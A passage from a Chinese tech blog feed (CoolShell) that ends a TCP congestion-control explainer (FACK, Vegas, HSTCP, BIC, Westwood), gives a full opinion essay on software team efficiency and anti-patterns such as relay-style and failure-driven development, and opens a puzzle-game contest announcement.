<li>然后触发Fast Recovery 的条件是： (<strong> ( snd.fack – snd.una ) &gt; (3*MSS) </strong>) || (dupacks == 3) ) 。这样一来，就不需要等到3个duplicated acks才重传，而是只要sack中的最大的一个数据和ack的数据比较长了（3个MSS），那就触发重传。在整个重传过程中cwnd不变。直到当第一次丢包的snd.nxt&lt;=snd.una（也就是重传的数据都被确认了），然后进来拥塞避免机制——cwnd线性上涨。</li>
</ul>
<p>我们可以看到如果没有FACK在，那么在丢包比较多的情况下，原来保守的算法会低估了需要使用的window的大小，而需要几个RTT的时间才会完成恢复，而FACK会比较激进地来干这事。 但是，FACK如果在一个网络包会被 reordering的网络里会有很大的问题。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95%E7%AE%80%E4%BB%8B"></span>其它拥塞控制算法简介<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="TCP_Vegas_%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E7%AE%97%E6%B3%95"></span><strong>TCP Vegas 拥塞控制算法</strong><span class="ez-toc-section-end"></span>
</h5>
<p>这个算法1994年被提出，它主要对TCP Reno 做了些修改。这个算法通过对RTT的非常重的监控来计算一个基准RTT。然后通过这个基准RTT来估计当前的网络实际带宽，如果实际带宽比我们的期望的带宽要小或是要多的活，那么就开始线性地减少或增加cwnd的大小。如果这个计算出来的RTT大于了Timeout后，那么，不等ack超时就直接重传。（Vegas 的核心思想是用RTT的值来影响拥塞窗口，而不是通过丢包） 这个算法的论文是《<a class="external text" style="color: #663366;" href="https://www.cs.cmu.edu/~srini/15-744/F02/readings/BP95.pdf" target="_blank" rel="nofollow">TCP Vegas: End to End Congestion Avoidance on a Global Internet</a>》这篇论文给了Vegas和 New Reno的对比：</p>
<p><img alt="image placeholder" ></p>
<p>关于这个算法实现，你可以参看Linux源码：<a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_vegas.h" target="_blank">/net/ipv4/tcp_vegas.h</a>， <a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_vegas.c" target="_blank">/net/ipv4/tcp_vegas.c</a></p>
<h5></h5>
<h5 style="color: #000000;">
<span class="ez-toc-section" id="HSTCPHigh_Speed_TCP_%E7%AE%97%E6%B3%95"></span>HSTCP(High Speed TCP) 算法<span class="ez-toc-section-end"></span>
</h5>
<p>这个算法来自<a href="https://tools.ietf.org/html/rfc3649" target="_blank">RFC 3649</a>（<a href="https://en.wikipedia.org/wiki/HSTCP" target="_blank">Wikipedia词条</a>）。其对最基础的算法进行了更改，他使得Congestion Window涨得快，减得慢。其中：</p>
<ul>
<li>拥塞避免时的窗口增长方式： cwnd = cwnd + α(cwnd) / cwnd</li>
<li>丢包后窗口下降方式：cwnd = (1- β(cwnd))*cwnd</li>
</ul>
<p>注：α(cwnd)和β(cwnd)都是函数，如果你要让他们和标准的TCP一样，那么让α(cwnd)=1，β(cwnd)=0.5就可以了。 对于α(cwnd)和β(cwnd)的值是个动态的变换的东西。 关于这个算法的实现，你可以参看Linux源码：<a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_highspeed.c" target="_blank">/net/ipv4/tcp_highspeed.c</a></p>
<h5>
<span class="ez-toc-section" id="_TCP_BIC_%E7%AE%97%E6%B3%95"></span> TCP BIC 算法<span class="ez-toc-section-end"></span>
</h5>
<p>2004年，产内出BIC算法。现在你还可以查得到相关的新闻《Google：<a href="https://www.google.com/search?lr=lang_zh-CN%7Clang_zh-TW&amp;newwindow=1&amp;biw=1366&amp;bih=597&amp;tbs=lr%3Alang_1zh-CN%7Clang_1zh-TW&amp;q=%E7%BE%8E%E7%A7%91%E5%AD%A6%E5%AE%B6%E7%A0%94%E5%8F%91BIC-TCP%E5%8D%8F%E8%AE%AE+%E9%80%9F%E5%BA%A6%E6%98%AFDSL%E5%85%AD%E5%8D%83%E5%80%8D&amp;oq=%E7%BE%8E%E7%A7%91%E5%AD%A6%E5%AE%B6%E7%A0%94%E5%8F%91BIC-TCP%E5%8D%8F%E8%AE%AE+%E9%80%9F%E5%BA%A6%E6%98%AFDSL%E5%85%AD%E5%8D%83%E5%80%8D" target="_blank">美科学家研发BIC-TCP协议 速度是DSL六千倍</a>》 BIC全称<a href="http://research.csc.ncsu.edu/netsrv/?q=content/bic-and-cubic" target="_blank">Binary Increase Congestion control</a>，在Linux 2.6.8中是默认拥塞控制算法。BIC的发明者发这么多的拥塞控制算法都在努力找一个合适的cwnd – Congestion Window，而且BIC-TCP的提出者们看穿了事情的本质，其实这就是一个搜索的过程，所以BIC这个算法主要用的是Binary Search——二分查找来干这个事。 关于这个算法实现，你可以参看Linux源码：<a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_bic.c" target="_blank">/net/ipv4/tcp_bic.c</a></p>
<h5>
<span class="ez-toc-section" id="TCP_WestWood%E7%AE%97%E6%B3%95"></span>TCP WestWood算法<span class="ez-toc-section-end"></span>
</h5>
<p><span style="color: #000000;">westwood采用和Reno相同的慢启动算法、拥塞避免算法。</span><span style="color: #000000;">westwood的主要改进方面：在发送端做带宽估计，当探测到丢包时，根据带宽值来设置拥塞窗口、</span><span style="color: #000000;">慢启动阈值。</span> 那么，这个算法是怎么测量带宽的？每个RTT时间，会测量一次带宽，测量带宽的公式很简单，就是这段RTT内成功被ack了多少字节。因为，这个带宽和用RTT计算RTO一样，也是需要从每个样本来平滑到一个值的——也是用一个加权移平均的公式。 另外，我们知道，如果一个网络的带宽是每秒可以发送X个字节，而RTT是一个数据发出去后确认需要的时候，所以，X * RTT应该是我们缓冲区大小。所以，在这个算法中，ssthresh的值就是est_BD * min-RTT(最小的RTT值)，如果丢包是Duplicated ACKs引起的，那么如果cwnd &gt; ssthresh，则 cwin = ssthresh。如果是RTO引起的，cwnd = 1，进入慢启动。   关于这个算法实现，你可以参看Linux源码： <a href="http://lxr.free-electrons.com/source/net/ipv4/tcp_westwood.c" target="_blank">/net/ipv4/tcp_westwood.c</a></p>
<h5>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h5>
<p>更多的算法，你可以从Wikipedia的 <a href="https://en.wikipedia.org/wiki/TCP_congestion-avoidance_algorithm" target="_blank">TCP Congestion Avoidance Algorithm</a> 词条中找到相关的线索</p>
<h4>
<span class="ez-toc-section" id="_%E5%90%8E%E8%AE%B0"></span> 后记<span class="ez-toc-section-end"></span>
</h4>
<p>好了，到这里我想可以结束了，TCP发展到今天，里面的东西可以写上好几本书。本文主要目的，还是把你带入这些古典的基础技术和知识中，希望本文能让你了解TCP，更希望本文能让你开始有学习这些基础或底层知识的兴趣和信心。</p>
<p>当然，TCP东西太多了，不同的人可能有不同的理解，而且本文可能也会有一些荒谬之言甚至错误，还希望得到您的反馈和批评。</p>
<p style="text-align: left;">（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-05-28T08:20:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/11609.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 开发团队的效率 ]]></title>
<link>https://coolshell.cn/articles/11656.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >我之前写过一篇叫《<a title="加班与效率" href="https://coolshell.cn/articles/10217.html" target="_blank">加班与效率</a>》的文章，从概念上说了一些我对“效率”的认识，但是那篇文章趋于概念化，对于一些没有经历过这样的环境的同学来说，可能会觉得太抽象了。很早以前就想写一篇更具体一点的，可执行的文章与《<a title="加班与效率" href="https://coolshell.cn/articles/10217.html" target="_blank">加班与效率</a>》这篇文章相辉映，并再把我两年前在杭州QCon上的那个<a href="http://vdisk.weibo.com/s/gN-sQ/1351485199" target="_blank">“<strong>鼓吹工程师文化”的《建一支强大的小团队》</strong></a>（新浪微盘）的观点再加强一下。</p>
<p><strong>但是我遇到了一些思维方式上的麻烦——我讲的总是从我的经历背景出发，没有从其它人的经历背景来讲</strong>。这就好像，我在酷壳里说了很多东西（比如：<a title="我们需要专职的QA吗？" href="https://coolshell.cn/articles/6994.html" target="_blank">专职的QA</a>，<a title="从Code Review 谈如何做技术" href="https://coolshell.cn/articles/11432.html" target="_blank">Code Review很重要</a>，<a title="编程能力与编程年龄" href="https://coolshell.cn/articles/10688.html" target="_blank">编程年龄</a>，<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html" target="_blank">创业的</a>，<a title="《Rework》摘录及感想" href="https://coolshell.cn/articles/9156.html" target="_blank">Rework</a>的……），有好些人觉得是不可能甚至太理想，其实我说的那些东西都是实实在在存在的，也是我所经历过的。于是，不同的经历，不同的环境，不同的眼界，造成了——有些人不理解我说的，而我也不能理解他们所说的。</p>
<p>所以，过去的这段时间我一有机会就找一些人交流并观察一些身边的事情，并去试着跟从和理解那些我不能理解的东西。现在觉得差不多了，所以，写下了这篇文章。（但越是去理解对方，我就越坚持我的观点，所以这篇文章可能还是会出现鸡同鸭讲的情形，无所谓了）</p>
<p>本文不讨论任何业务上的效率问题，只讨论软件开发或是软件工程中的效率问题。虽然产品和业务上的效率问题是根本，但是因为本文不是拉仇恨的，我也不想混在一起谈，所以请原谅我在这里先说开发团队的，以后重新开篇文章专门谈产品和业务的。</p>
<p>我下面会罗列几个非常典型的开发方式——<strong>软件开发中的“锁”</strong>，<strong>接力棒式软件开发</strong>，<strong>保姆式软件开发</strong>，<strong>WatchDog软件开发</strong>，<strong>故障驱动式软件开发</strong>。</p>
<p><span id="more-11656"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E9%94%81" title="软件开发中的“锁”">软件开发中的“锁”</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91" title="【解决方案】">【解决方案】</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E6%8E%A5%E5%8A%9B%E6%A3%92%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91" title="“接力棒式”软件开发">“接力棒式”软件开发</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-2" title="【解决方案】">【解决方案】</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E4%BF%9D%E5%A7%86%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91" title="“保姆式”软件开发">“保姆式”软件开发</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-3" title="【解决方案】">【解决方案】</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-7" href="#WatchDog%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91" title="“WatchDog式”软件开发">“WatchDog式”软件开发</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-4" title="【解决方案】">【解决方案】</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-9" href="#%E6%95%85%E9%9A%9C%E9%A9%B1%E5%8A%A8%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91" title="“故障驱动式”软件开发">“故障驱动式”软件开发</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-5" title="【解决方案】">【解决方案】</a></li></ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#%E5%85%B6%E5%AE%83%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F" title="其它开发方式">其它开发方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B" title="总结一下">总结一下</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E9%94%81"></span>软件开发中的“锁”<span class="ez-toc-section-end"></span>
</h4>
<p>如果你搞过并发编程，你一定知道什么是“锁”，锁就是用来同步和互斥。我发现有好些开发部门里的各个开发团队间存在很多锁。比如：</p>
<ul>
<li>
<strong>技术能力上的锁</strong>。有一个项目需要在不同的地方做开发，这些模块用到不同的技术，比如：Java, C/C++, Python，Javascript，但是，这个团队里的每一个开发人员就只懂一门语言，于是，需要配合，需要任务排期，同步互斥锁就很多，于是，一个本来只需要2个人干3周的的工作变成了8个人干两个月。</li>
</ul>
<ul>
<li>
<strong>负责模块上的锁</strong>。同理，不同的人负责不同的模块，于是一个项目要动好多模块，那么你就需要把这些模块的人找过来，和上面一样。每个人都有自己的时间安排，人越多，锁越多。于是，一个来来只需要2个人干2两周的事，变成了7、8个人干一个多月。</li>
</ul>
<p>我上面并非瞎扯，这都是事实。我们可以看到，</p>
<ul>
<li>
<strong>时间锁、进度锁</strong>。这堆有不同技能或是负责不同模块的开发人员有锁，有锁你就要等，他们有自己的安排，所以，要协作起来，你就需要排期，去同步。而参与的人越多，你的锁就越多。你协调他们的时间就更复杂。</li>
</ul>
<ul>
<li>
<strong>沟通锁、利益锁</strong>。而且，最恐怖的事情是，他们之间的沟通成本巨大。他们会花大量的时间在讨论，一个功能是实现在你那边，还是我这边，每个人都有自己的利益和算盘。无形中增加了很多推诿、官僚和政治上的东西。</li>
</ul>
<p>有时候，我们会觉得分工和分模块是产生效率的前提，但是实际情况并不是这样。我们也可以看到，<strong>所谓的“分工”被彻彻底底的滥用了</strong>。他们把“分工”当成了永远只干一件事的借口。</p>
<h5>
<span class="ez-toc-section" id="%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91"></span>【解决方案】<span class="ez-toc-section-end"></span>
</h5>
<p><strong>一个程序员应该能够掌握多个语言，也能够负责多个模块甚至不同的职责。如果一个程序员觉得多学习一门语言，多掌握一个模块是件很困难的事，那么这个程序员本质上是不合格的</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E6%8E%A5%E5%8A%9B%E6%A3%92%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91"></span>“接力棒式”软件开发<span class="ez-toc-section-end"></span>
</h4>
<p><strong>在有各种“工作锁”的软件开发团队里，一般都无法避免“接力棒式”的开发</strong>。也就是说，底层的C程序员干完了，交给上层的Java程序员，然后再交给更上层的前端程序员，最后再交给运维人员。这就是接力棒式的开发。</p>
<p>而且，更糟糕的是，如果在引入了软件流程下，这种“接力棒的方式”真是会把你搞崩溃的。比如下游团队开发一个月，交给QA测试一个月，再交给运维分步上线一个月，然后，上游团队拿到下游开发的API后开发一个月，再交给自己的QA测试一个月，然后再交给自己的运维上线一个月，于是，半年就这样过去了。<strong>这是一个由一个一个小瀑布叠出来的一个大瀑布</strong>。</p>
<p>哦，你会说，这个好办啊，上下游不会先商定好接口么？然后做并行开发么？是的，这是其中的一个优化方式，但是需要很好的接口设计。但是，在实际过程中，你会发现（这时我并非信口开河，我说的都是事实），</p>
<ul>
<li>如果这两个上下游团队在一起还好办，要是不在一起，那么，实际情况是，后面的团队会等到前面的团队提测了，才开始开发，本质上就是串行开发的。</li>
</ul>
<ul>
<li>如果有更多的团队呢？比如：A团队 -&gt; B团队 -&gt; C团队 -&gt;D团队呢。接口就变得非常地关键了。而在实际情况下，因为没有好的接口设计人员，所以，在开发过程经常性地修改接口，或者是因为接口不好用也只得忍着。</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-2"></span>【解决方案】<span class="ez-toc-section-end"></span>
</h5>
<p>我以前写过一篇叫《<a title="IoC/DIP其实是一种管理思想" href="https://coolshell.cn/articles/9949.html" target="_blank" rel="bookmark">IoC/DIP其实是一种管理思想</a>》，对于这种接力棒的方式，应该反过来，<strong>如果业务应用团队是A团队，那B/C/D团队应该把自己的做成一个开发框架也好，服务化也好，让应用团队自己来接入</strong>。比如：前端做好一个前端开发框架，PE做好一个运维开发框架、各种工具，共享模块团队做好开发框架，让应用团队自己来接入，而不是帮他做。<strong>你会发现，在这么多团队各自P2P勾兑出来的很随意的接口的所带来的成本已经远超过一个统一标准的协议</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%BF%9D%E5%A7%86%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91"></span>“保姆式”软件开发<span class="ez-toc-section-end"></span>
</h4>
<p>所谓“保姆式”软件开发就是——我只管吃饭，不管做菜洗碗，就像——衣来伸手，饭来张口的“小皇帝”一样，身边有一堆太监或宫女，不然生活不能自理。这种情况经常见于开发和测试，开发和运维间的关系。很多公司，测试和运维都成了开发的保姆。</p>
<p>我就能看到，很多开发快速写完代码后基本上都不怎么测试就交给QA去测试了，QA一测，我草，各种问题，而只会做黑盒的QA并不能马上就能确定是代码的问题还是环境的问题，所以还要花大量时间排除不是环境问题，才给开发报BUG。很多问题，可能只需要做个Code Review，做个单测就可以发现了，硬要交给QA。运维也是一样的，开发出来的软件根本就没有考虑什么运维的东西，因为有运维人员，所以我才不考虑呢。</p>
<p><strong>这和我们带孩子的道理是一样的，对于孩子来说，如果父母帮孩子做得越多，孩子就越觉得理所应当，就越不会去做</strong>。</p>
<p><strong>“保姆式”开发一般会进化成“保安式”开发</strong>。</p>
<ul>
<li>因为你的团队开发人员的能力不行，设计不行，Code Reivew/UT不做，你就只能找堆QA看着他。</li>
<li>因为Dev/QA只管功能不管运维，所以，还得找堆运维人员看着他们。</li>
<li>因为你的技术人员不懂业务，不懂需求，需要再找个BA，找个产品经理来指挥他。</li>
<li>因为你的技术人员不会管理项目，所以，再搞个项目经理，找个敏捷教练、以及SQA来管着他。</li>
</ul>
<p><strong>就这样，你不行，我找人来看着你，看你的人不行，我再找人来看着看你的人……层层保姆，层层保安。</strong>于是，你就会发现，团队或部门里的人员越来越多，你整天都在开会，整天都在互相解释，互相争吵，会扯淡的人越来越多。那还有个屁的效率。</p>
<p style="text-align: center;"><img alt="image placeholder" >网络上一个非常经典的图片，来源不详，程序员在挖坑，其它人站在当监工</p>
<h5>
<span class="ez-toc-section" id="%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-3"></span>【解决方案】<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">1）<strong>不要招只会写代码的“码农”，要招懂“需求”，注重“软件工程”和“软件质量”和“软件维护”的“工程师”</strong>。</p>
<p style="padding-left: 30px;">2）<strong>最好的管理，不是找人来管人，而是自己管自己</strong>。</p>
<p style="padding-left: 30px;">3）<strong>组织和团队中支持性工作的人越少越好，最好不要</strong>。</p>
<p style="padding-left: 30px;">4）<strong>服务化。我服务于你并不代表我要帮你干活，而是代表——我要让你干活干得更爽</strong>。</p>
<p>我在<a href="https://weibo.com/1401880315/B6hC7elDb" target="_blank">微博</a>上说过下面的话，（大家可以体会一下保姆和服务的差别）</p>
<p style="padding-left: 30px;">运维要用“云服务”的思路去做。如果一个公司内的运维团队开发出一堆工具，让做应用开发团队可以很容易地申请机器、存储、网络、中间件、安全等资源，并很容易管理、监控和部署应用，并提供运维资询。而不是帮应用开发团队干活擦屁股当保姆。那么，这个公司就会不经意地做出一个云计算平台来了。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="WatchDog%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91"></span>“WatchDog式”软件开发<span class="ez-toc-section-end"></span>
</h4>
<p>什么是WatchDog？就是说——<strong>为了解决某个系统的问题，我要用一个新的系统去看着它</strong>。</p>
<ul>
<li>我的系统架构太复杂，出了问题不好查找。咋办？那就搞个专门的特殊的监控系统吧……</li>
</ul>
<ul>
<li>我的系统配置太复杂，容易配错了。咋办？那就加一个配置校验系统吧……</li>
</ul>
<ul>
<li>我的系统配置和真实的情况有时候可能会不一性。咋办？那就加一个巡检系统吧……</li>
</ul>
<ul>
<li>我的系统测试环境和线上环境有时候会搞混了。咋办？那就为线上环境加一个权限控制系统吧……</li>
</ul>
<ul>
<li>我的系统有单点，那就加个负载均衡器吧，负载均衡器的单点呢？那就再加个等价路由器吧……</li>
</ul>
<p><strong>做加法谁不会？就不想去简化一样系统吗？就不能不拆东墙补西墙么？</strong>这些了系统加的越来越多，我看你以后怎么运维。</p>
<p>一开始没有想清楚就放到线上，然后，出了故障后，也无法重新设计和重新架构，只能以打补丁地方式往上打，这就好像一个本来就有缺陷的楼没有盖好，你要拆了重盖是不可能的，也只能不停地打补丁了。字是一只狗，越描越丑。</p>
<h5>
<span class="ez-toc-section" id="%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-4"></span>【解决方案】<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;"><strong>1）设计想好了再做，多评估几个设计没坏处，简化，简化，简化。</strong></p>
<p style="padding-left: 30px;"><strong>2）残酷无情地还债，就算是CEO来了，也无法阻止我还债的脚步。</strong></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E6%95%85%E9%9A%9C%E9%A9%B1%E5%8A%A8%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91"></span>“故障驱动式”软件开发<span class="ez-toc-section-end"></span>
</h4>
<p>WatchDog式的软件开发通常来说都是“故障驱动式”软件开发的产物。这种开发方式其实就是在表明自己智力和能力的不足。以上线为目的，上了线再说，有什么问题出了再改。</p>
<p>上面的老大或是业务方基本上会说，没关系，我们不一开始并不需要一个完美的系统，你先上了再说，先解业务的渴，我们后面有时间再重构再完善。而有的技术人员也会用“架构和设计是逐步演化出来的”这句话来证明“故障驱动”开发是值得的。</p>
<p>我同意逐步迭代以及架构演化论，但是，我觉得<strong>“系统迭代说”和“架构演化论”被彻彻底底地成为那些能力有限甚至不学无术的人的超级借口</strong>。</p>
<p>你们有没有搞错啊？你们知道什么叫迭代，什么叫演化吗？你们知道，要定位一个线上的故障需要花多大的力气吗？（<a href="http://blog.aliyun.com/341" target="_blank">看看这篇文章</a>你就知道了）你们知道，随随便便去应付局部上你会快，但总体上来说你会慢。</p>
<p>虽然，我看到那些系统在一个又一个的故障后得到一点又一点的改善，但是我想说，为什么一开始不认真不严谨一点呢？我从来就没有见过一个精良的系统是靠一个一个的故障和失败案例给堆出来的，就算是Windows 95/98这样史上最烂的操作系统，如果没有设计精良Windows NT的补位，Windows也早玩完了（看看IE的下场就知道了）。</p>
<h5>
<span class="ez-toc-section" id="%E3%80%90%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91-5"></span>【解决方案】<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;"><strong>1）基础知识和理论知识非常重要</strong>。多多使用已有的成熟的方案是关键。</p>
<p style="padding-left: 30px;"><strong>2）对技术要有一颗严谨和敬畏的心。想清楚了再干，坚持高标准，Design for failure! </strong>很多事情都急不得。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F"></span>其它开发方式<span class="ez-toc-section-end"></span>
</h4>
<p>其实，这样的事情还有很多。比如：</p>
<p><strong>1）配置管理上的问题</strong>。对于源代码的配置管理，其实并不是一件简单的事情。配置管理和软件和团队的组构的结构非常有关系。我看到过两种非常没有效率的配置管理，一种是以开项目分支的方式来做项目，同时开很多分支，分支开的时间还很长，导致merge回主干要花大量的时间去解决各种冲突，另一种是N多的团队都在一个代码库中做修改，导致出现很多复杂的问题，比如某团队的改动出现了一个bug，要么所有的团队的功能都得等这个bug被修复才能被发布，要么就是把所有的改动回滚到上一个版本，包括其它团队开发的功能。很明显，软件模块的结构，软件的架构，以及团队的组织形式都会严重影响开发效率。</p>
<p><strong>2）人肉式的软件开发</strong>。大多数的软件团队和主管都会用“人手不够”做为自己开发效率不够的借口，而大多数故障发生的时候，都会使用更重的“人肉流程”来弥补自己能力的不足。他们从来没有想过使用“技术”，使用更“聪明”的方式来解决问题。</p>
<p><strong>3）会议驱动式开发</strong>。人多了，团队多了，想法也就多了，沟通也就多了，于是需要不停得开会开会开会。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"></span>总结一下<span class="ez-toc-section-end"></span>
</h4>
<p>综上所述，我有如下总结：</p>
<p style="padding-left: 30px;">1）<strong>软件工程师分工分得越细这个团队就越没效率，团队间的服务化是关键的关键</strong>。不管是从语言上还是从软件模块上的人员分工，越细越糟糕。服务化不是我要帮你做事，而是我让你做起事来更容易。</p>
<p style="padding-left: 30px;">2）<strong>你总需要在一个环节上认真，这个环节越往前就越有效率，越往后你就越没效率</strong>。要么你设计和编码认真点，不然，你就得在测试上认真点。要是你设计、编码、测试都不认真，那你就得在运维上认真，就得在处理故障上认真。你总需要在一个地方认真。另外一篇文章你可以看一下——《<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多些时间少写些代码</a>》</p>
<p style="padding-left: 30px;">3）<strong>“小而精的团队”+“条件和资源受限”是效率的根本</strong>。只有团队小，内耗才会小，只有条件或资源受限，才会逼着你去用最经济的手段做最有价值的事，才会逼着你喜欢简单和简化。</p>
<p style="padding-left: 30px;">4）<strong>技术债是不能欠的，要残酷无情地还债</strong>。很多事情，一开始不会有，那么就永远不会有。一旦一个事情烂了，后面只能跟着一起烂，烂得越多，就越没有人敢去还债。</p>
<p style="padding-left: 30px;">5）<strong>软件架构上要松耦合，团队组织上要紧耦合</strong>。</p>
<p style="padding-left: 30px;">6）<strong>工程师文化是关键，重视过程就是重视结果</strong>。只重视结果的KPI等同于“竭泽而渔”和“饮鸩止渴”。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-06-09T09:06:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/11656.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 【活动】解迷题送礼物 ]]></title>
<link>https://coolshell.cn/articles/11832.html</link>
<content><![CDATA[ 
<p>首先，先跟大家道歉一下最近CoolShell大约长达一个多月没有什么更新，原因主要在于，我去看世界杯去了，这一个月的世界杯熬夜看球使我的精力不佳，导致世界杯结束后的几个星期也没有缓过来，所以没有更新什么文章。好多朋友写邮件或是在微博上at我催我更新，所以有点惭愧了。</p>
<p>精神不佳我就不写文章了。于是，世界杯过后，我每天都会抽出每天晚上和周末的一些碎片时间，我仿照一些前端过关的游戏，做了几个和程序员有关的迷题，也是要通关的，不过和前端知识没什么关系。这个游戏我放到了下面这个二级域名下。</p>
<p style="text-align: center;"><strong><a href="http://fun.coolshell.cn/" target="_blank">http://fun.coolshell.cn/</a></strong></p>
<p style="text-align: left;"><a href="http://fun.coolshell.cn/"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">有兴趣的朋友可以去玩玩。通关的同学我会送你们《Unix环境高级编程（第三版）》<span style="color: #423009;">（感谢<a style="color: #6c6351;" href="https://weibo.com/n/%E5%87%BA%E7%89%88%E5%9C%88%E9%83%AD%E5%BF%97%E6%95%8F?from=feed&amp;loc=at">@出版圈郭志敏</a> 赞助）或一个马克杯（感谢<a style="color: #6c6351;" href="https://weibo.com/n/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%B2%BE%E9%80%89%E7%BD%91?from=feed&amp;loc=at">@linux命令行精选网</a> 赞助）</span>），因为奖品数量有限，所以，我会送给前十个通关的同学（后面通关的我会随机抽几个）。</p>
<p style="text-align: left;"><span id="more-11832"></span></p>
<p style="text-align: center;"><img alt="image placeholder" >  <img alt="image placeholder" ></p>
<p style="text-align: left;">最后说一下这些迷题：</p>
<p style="text-align: left; padding-left: 30px;">1）目前一共有10个迷题。你通关会出现个Congratulations的页面和一个表单，希望你能提供一下你的联系方式（联系方式只要你的email/weibo/twitter/homepage这样你比较公开的方式）。</p>
<p style="text-align: left; padding-left: 30px;">2）为了突出fun，所以，这些迷题中有好些基于一些“有趣”的知识的（可能有些知识你是不知道的）。</p>
